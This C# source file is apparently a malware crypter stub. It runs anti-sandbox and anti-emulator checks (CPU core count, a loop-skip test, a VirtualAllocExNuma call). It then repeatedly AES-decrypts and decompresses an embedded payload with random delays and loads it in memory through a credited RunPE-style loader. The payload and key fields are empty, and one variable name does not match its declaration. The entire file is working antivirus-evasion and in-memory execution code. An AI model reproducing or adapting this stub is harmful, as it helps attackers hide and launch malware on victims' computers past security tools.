using System;
using System.IO;
using System.IO.Compression;
using System.Security.Cryptography;
using System.Threading;

using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Reflection;
using System.Security;


namespace StubTemplate
{
    class Program
    {
        static void Main(string[] args)
        {
            int t = 5;
            if (!IsSandboxed() && !SkipsCheck() && NumaSafe())
                DoMain();
            else
                t = 8;
        }

        public static byte[] Decompress(byte[] data)
        {
            using (var inputStream = new MemoryStream(data))
            using (var gZipStream = new GZipStream(inputStream, CompressionMode.Decompress))
            using (var outputStream = new MemoryStream())
            {
                gZipStream.CopyTo(outputStream);
                byte[] decompressedData = outputStream.ToArray();
                return decompressedData;
            }
        }

        public static byte[] Decrypt(byte[] data, string key, AesManaged aes)
        {
            Array.Reverse(data);
            aes.Key = Convert.FromBase64String(key);
            byte[] IV = new byte[16];
            for (int i = 0; i < IV.Length; i++)
                IV[i] = data[i];
            aes.IV = IV;
            ICryptoTransform decryptor = aes.CreateDecryptor();
            byte[] compressed = decryptor.TransformFinalBlock(data, 16, data.Length - 16);
            return Decompress(compressed);
        }

        public static void DoMain()
        {

            // Setting data.
            byte[] encryptedData = Convert.FromBase64String("");
            string key = "";
            AesManaged aes = new AesManaged();
            Random rnd = new Random();

            // Setting AES Settings
            aes.Mode = CipherMode.CBC;
            aes.BlockSize = 128;
            aes.Padding = PaddingMode.PKCS7;
            aes.KeySize = 256;

            // Setting Payload
            int iterations = 10;
            byte[] payload = encryptedData;
            for (int i = 0; i < iterations; i++)
            {
                payload = Decrypt(payload, encryptionKey, aes);
                Thread.Sleep(rnd.Next(100, 950));
            }

            // Runs Payload
            Run(payload);

        }



        [SuppressUnmanagedCodeSecurity]
        delegate object ExecuteAssembly(object sender, object[] parameters);

        /// <summary>
        /// RunPE for .Net | Created by gigajew@hf
        /// </summary>
        /// <param name="buffer">Payload</param>
        public static void Run(byte[] buffer)
        {
            int e_lfanew = BitConverter.ToInt32(buffer, 0x3c);
            Buffer.SetByte(buffer, e_lfanew + 0x398, 2);

            object[] parameters = null;

            Assembly assembly = Thread.GetDomain().Load(buffer);
            MethodInfo entrypoint = assembly.EntryPoint;
            if (entrypoint.GetParameters().Length > 0)
                parameters = new object[] { new string[] { null } };

            Thread assemblyExecuteThread = new Thread(() =>
            {
                Thread.BeginThreadAffinity();
                Thread.BeginCriticalRegion();

                ExecuteAssembly executeAssembly = new ExecuteAssembly(entrypoint.Invoke);
                executeAssembly(null, parameters);

                Thread.EndCriticalRegion();
                Thread.EndThreadAffinity();
            });

            if (parameters != null)
            {
                if (parameters.Length > 0)
                    assemblyExecuteThread.SetApartmentState(ApartmentState.STA);
                else
                    assemblyExecuteThread.SetApartmentState(ApartmentState.MTA);
            }

            assemblyExecuteThread.Start();
        }




        //-----Anti-Dynamic-AVs-Check-↓------------Decryption-and-such-↑---------------

        /// <summary>
        /// Since AV products can’t afford allocating too much resource from host computer we can check the core number in order to determine are we in a sandbox or not.  
        /// </summary>
        /// <returns>Returns whether or not the system has more than 2 cores</returns>
        public static bool IsSandboxed()
        {
            if (Environment.ProcessorCount > 2)
                return false;
            return true;
        }

        /// <summary>
        /// Makes sure the environment doesnt skip big loops
        /// </summary>
        /// <returns>Whether or not skips were made.</returns>
        public static bool SkipsCheck()
        {
            int dummy = 0;
            int i;
            for (i = 0; i < 100000000; i++)
                dummy++;
            if (i == dummy)
                return false;
            return true;
        }

        [DllImport("kernel32.dll")]
        private static extern int VirtualAllocExNuma(IntPtr hProcess, int lpAddress, int dwSize, int flAllocationType, int flProtect, int nndPreferred);

        /// <summary>
        /// The next code will work on a regular PC but will fail in AV emulators.
        /// </summary>
        /// <returns></returns>
        public static bool NumaSafe()
        {
            object mem = null;
            mem = VirtualAllocExNuma(Process.GetCurrentProcess().Handle, 0, 1000, 0x3000, 0x40, 0);
            if (mem != null)
                return true;
            return false;
        }




    }
}
